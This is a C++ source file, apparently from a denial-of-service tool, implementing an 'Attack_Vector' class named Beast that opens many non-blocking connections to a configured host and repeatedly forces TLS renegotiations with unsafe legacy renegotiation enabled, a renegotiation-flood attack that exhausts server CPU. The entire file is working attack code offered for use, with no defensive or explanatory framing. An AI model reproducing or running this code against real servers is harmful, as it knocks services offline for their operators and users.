#include <sys/time.h>
#include <fcntl.h>
#include <unistd.h>
#include <cstring>
#include <openssl/ssl.h>

#include "../Headers/Beast.hpp"
#include "../Headers/Logging.hpp"

Beast::Beast(std::shared_ptr<Config> config) : Attack_Vector(std::move(config)) {

}

void Beast::attack() {
    init();
    fd_set rfds;
    fd_set wfds;
    struct timeval tv{};
    while(true){
        for(int i = 0; i < opt.n_peers; i++){
            if(peers[i].flags & FL_PEER_WANT_NEXT_STATE){
                NextState(&peers[i]);
            }
        }
        tv.tv_sec = 0;
        tv.tv_usec = 100 * 1000;
        bcopy(&rfds, &opt.rfds, sizeof(rfds));
        bcopy(&wfds, &opt.wfds, sizeof(wfds));
        int n = select(opt.max_sox + 1, &rfds, &wfds, nullptr, &tv);
        gettimeofday(&tv, nullptr);
        if(tv.tv_sec != opt.stat.epoch_start_usec / 1000000){
            if(opt.stat.total_tcp_connections > 0){
                update_stat(&tv);
            }
        }
        if(n < 0){
            print_error("Select()");
            exit(EXIT_FAILURE);
        }
        int end = opt.n_peers;
        for(int i = 0; i < end; i++){
            if((peers[i].state == TCP_CONNECTING) && (peers[i].tv_connect_sec + TO_TCP_CONNECT < tv.tv_sec)){
                char message[512];
                snprintf(message, sizeof(message), "Connection timed out: %d", i);
                print_warning(message);
                PEER_disconnect(&peers[i]);
                continue;
            }
            if(peers[i].sox < 0){
                continue;
            }
            if(FD_ISSET(peers[i].sox, &rfds)){
                PEER_read(&peers[i]);
                continue;
            }
            if(FD_ISSET(peers[i].sox, &wfds)){
                PEER_write(&peers[i]);
                continue;
            }
            (*config->req)++;
        }
        (*config->voly)++;
        pause();
    }

}

void Beast::init() {
    opt.n_max_peers = static_cast<uint16_t>(config->CONNECTIONS);
    FD_ZERO(&opt.rfds);
    FD_ZERO(&opt.wfds);
    OpenSSL_add_ssl_algorithms();
    SSL_load_error_strings();
    opt.ctx = SSL_CTX_new(SSLv23_method());
    SSL_CTX_set_options(opt.ctx, SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION);
    SSL_CTX_set_options(opt.ctx, SSL_OP_LEGACY_SERVER_CONNECT);
    SSL_CTX_set_cipher_list(opt.ctx, "AES256-SHA:RC4-MD5");
    for (auto &peer : peers) {
        peer.sox = -1;
    }
    opt.n_peers = 1;
    for (int i = 0; i < opt.n_peers; i++){
        PEER_disconnect(&peers[i]);
    }
}

void Beast::SSL_set_rw(_peer *p, int ret) {
    int err;
    err = SSL_get_error(p->ssl, ret);
    switch (err){
        case SSL_ERROR_WANT_READ:
            FD_SET(p->sox, &opt.rfds);
            FD_CLR(p->sox, &opt.wfds);
            break;
        case SSL_ERROR_WANT_WRITE:
            FD_SET(p->sox, &opt.wfds);
            FD_CLR(p->sox, &opt.rfds);
            break;
        default:
            if(opt.stat.total_ssl_connect <= 0){
                print_error("SSL error");
                exit(EXIT_FAILURE);
            }
            opt.stat.error_count++;
            PEER_disconnect(p);
            return;
    }
}

int Beast::ssl_handshake_io(_peer *p) {
    int ret;
    char buf[1024];
    while (true){
        ret = SSL_read(p->ssl, buf, sizeof(buf));
        if(ret <= 0){
            break;
        }
    }
    ret = SSL_do_handshake(p->ssl);
    if(ret == -1){
        p->flags |= FL_PEER_WANT_NEXT_STATE;
        opt.stat.total_renegotiations++;
        p->count_renegotiations++;
        if(p->count_renegotiations % 50 == 0){
            p->state = SSL_DUMMYWRITE;
        }else{
            p->state = SSL_HANDSHAKING;
        }
        return 0;
    }

    int err = SSL_get_error(p->ssl, ret);
    if((err != SSL_ERROR_WANT_READ) && (err != SSL_ERROR_WANT_WRITE)){
        if(opt.stat.total_renegotiations <= 0){
            print_error("Renegotiations error");
            exit(EXIT_FAILURE);
        }
    }
    SSL_set_rw(p, ret);
    return 0;
}

int Beast::ssl_connect_io(_peer *p) {
    int ret = SSL_connect(p->ssl);
    if(ret == 1){
        opt.stat.total_ssl_connect++;
        p->flags |= FL_PEER_WANT_NEXT_STATE;
        p->state = SSL_HANDSHAKING;
        return 0;
    }

    SSL_set_rw(p, ret);
    return 0;
}

int Beast::ssl_dummywrite_io(_peer *p) {
    char c = 0;
    int ret = SSL_write(p->ssl, &c, 1);
    if(ret == 1){
        p->flags |= FL_PEER_WANT_NEXT_STATE;
        p->state = SSL_HANDSHAKING;
        return 0;
    }
    SSL_set_rw(p, ret);
    return 0;
}

void Beast::PEER_SSL_dummywrite(_peer *p) {
    p->state = SSL_DUMMYWRITE;
    ssl_dummywrite_io(p);
}

void Beast::PEER_SSL_renegotiate(_peer *p) {
    int ret = SSL_renegotiate(p->ssl);
    if(ret != 1){
        opt.stat.error_count++;
        PEER_disconnect(p);
        return;
    }
    p->state = SSL_HANDSHAKING;
    ssl_handshake_io(p);
}

void Beast::PEER_SSL_connect(_peer *p) {
    p->ssl = SSL_new(opt.ctx);
    SSL_set_fd(p->ssl, p->sox);
    p->state = SSL_CONNECTING;
    ssl_connect_io(p);
}

void Beast::PEER_connect(_peer *p) {
    if (tcp_connect(p) != 0){
        print_error("Tcp_connect()");
        exit(EXIT_FAILURE);
    }
}

void Beast::PEER_disconnect(_peer *p) {
    if(p->ssl != nullptr){
        SSL_free(p->ssl);
        p->ssl = nullptr;
    }
    if(p->sox >= 0){
        FD_CLR(p->sox, &opt.rfds);
        FD_CLR(p->sox, &opt.wfds);
        close(p->sox);
        p->sox = -1;
    }
    p->state = TCP_CONNECTING;
    p->flags = FL_PEER_WANT_NEXT_STATE;
}

void Beast::PEER_read(_peer *p) {
    CompleteState(p);
}

void Beast::PEER_write(_peer *p) {
    CompleteState(p);
}

int Beast::tcp_connect_io(_peer *p) {
    int ret;
    socklen_t len;
    len = 4;
    getsockopt(p->sox, SOL_SOCKET, SO_ERROR, &errno, &len);
    ret = tcp_connect_try_finish(p, errno);
    return ret;
}

int Beast::tcp_connect_try_finish(_peer *p, int ret) {
    if(ret != 0){
        if((errno != EINPROGRESS) && (errno != EAGAIN)){
            if(opt.stat.total_tcp_connections <= 0){
                print_error("Tcp connect");
                exit(EXIT_FAILURE);
            }
            return -1;
        }
        p->state = TCP_CONNECTING;
        FD_CLR(p->sox, &opt.wfds);
        PEER_SSL_connect(p);
        return 0;
    }else{
        opt.stat.total_tcp_connections++;
        FD_CLR(p->sox, &opt.wfds);
        PEER_SSL_connect(p);
    }
    return 0;
}

int Beast::tcp_connect(_peer *p) {
    int ret;
    p->sox = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(p->sox < 0){
        return -1;
    }
    if(p->sox > opt.max_sox){
        opt.max_sox = p->sox;
    }
    fcntl(p->sox, F_SETFL, fcntl(p->sox, F_GETFL, 0) | O_NONBLOCK);
    memset(&p->addr, 0, sizeof(p->addr));
    p->addr.sin_family = AF_UNSPEC;
    p->addr.sin_port = htons(static_cast<uint16_t>(strtol(config->port.c_str(), nullptr, 10)));
    p->addr.sin_addr.s_addr = inet_addr(config->website.c_str());
    ret = connect(p->sox, reinterpret_cast<sockaddr *>(&p->addr), sizeof(p->addr));
    struct timeval tv{};
    gettimeofday(&tv, nullptr);
    p->tv_connect_sec = static_cast<uint32_t>(tv.tv_sec);
    ret = tcp_connect_try_finish(p, ret);
    return ret;
}

void Beast::NextState(_peer *p) {
    p->flags &= ~FL_PEER_WANT_NEXT_STATE;
    switch (p->state){
        case TCP_CONNECTING:
            PEER_connect(p);
            break;
        case SSL_DUMMYWRITE:
            PEER_SSL_dummywrite(p);
            break;
        case SSL_HANDSHAKING:
            PEER_SSL_renegotiate(p);
            break;
        default:break;
    }
}

void Beast::CompleteState(_peer *p) {
    int ret;
    switch (p->state){
        case TCP_CONNECTING:
            ret = tcp_connect_io(p);
            if(ret != 0){
                opt.stat.error_count++;
                PEER_disconnect(p);
            }else{
                if(opt.n_peers < opt.n_max_peers){
                    if(peers[opt.n_peers].state != UNKNOWN){
                        print_error("Tnternal error");
                        exit(EXIT_FAILURE);
                    }
                    PEER_disconnect(&peers[opt.n_peers]);
                    opt.n_peers++;
                }
            }
            break;
        case SSL_CONNECTING:
            ret = ssl_connect_io(p);
            if(ret != 0){
                print_error("SSL_connect_io()");
                exit(EXIT_FAILURE);
            }
            break;
        case SSL_HANDSHAKING:
            ret = ssl_handshake_io(p);
            if(ret != 0){
                opt.stat.error_count++;
                PEER_disconnect(p);
            }
            break;
        case SSL_DUMMYWRITE:
            ret = ssl_dummywrite_io(p);
            if(ret != 0){
                opt.stat.error_count++;
                PEER_disconnect(p);
            }
            break;
        default:
            print_error("Unknown state");
            exit(EXIT_FAILURE);
    }
}

uint64_t Beast::getusec(struct timeval *tv) {
    struct timeval tv_l{};
    if(tv == nullptr){
        tv = &tv_l;
        gettimeofday(tv, nullptr);
    }
    return static_cast<uint64_t>(tv->tv_sec * 1000000 + tv->tv_usec);
}

void Beast::update_stat(struct timeval *tv) {
    uint64_t usec_now = getusec(tv);
    int32_t conn = 0;
    for(int i = 0; i < opt.n_peers; i++){
        if(peers[i].sox < 0){
            continue;
        }
        if(peers[i].state > TCP_CONNECTING){
            conn++;
        }
    }
    opt.stat.epoch_start_renegotiations = opt.stat.total_renegotiations;
    opt.stat.epoch_start_usec = usec_now;
}
